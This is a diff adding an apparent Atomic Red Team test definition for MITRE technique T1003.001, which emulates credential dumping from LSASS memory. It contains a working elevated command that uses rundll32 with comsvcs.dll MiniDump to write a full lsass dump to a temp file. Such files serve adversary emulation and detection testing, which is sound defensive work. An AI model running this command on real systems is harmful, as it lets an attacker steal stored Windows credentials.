@@ -1,0 +1,19 @@
+attack_technique: T1003.001
+display_name: 'OS Credential Dumping: LSASS Memory'
+atomic_tests:
+- name: LSASS Memory
+  auto_generated_guid: 3903b658-867c-467e-9c80-25af22233106
+  description: |
+    The Local Security Authority Subsystem Service (LSASS) is a boon for adversaries looking to steal sensitive credentials, with a little help from administrative tools such as ProcDump.
+  supported_platforms:
+  - windows
+  input_arguments:
+    output_file:
+      description: Target output dump file
+      type: string
+      default: C:\Windows\Temp\lsass.dmp
+  executor:
+    command: |
+      rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump ((Get-Process lsass).Id) #{output_file} full
+    name: powershell
+    elevation_required: true
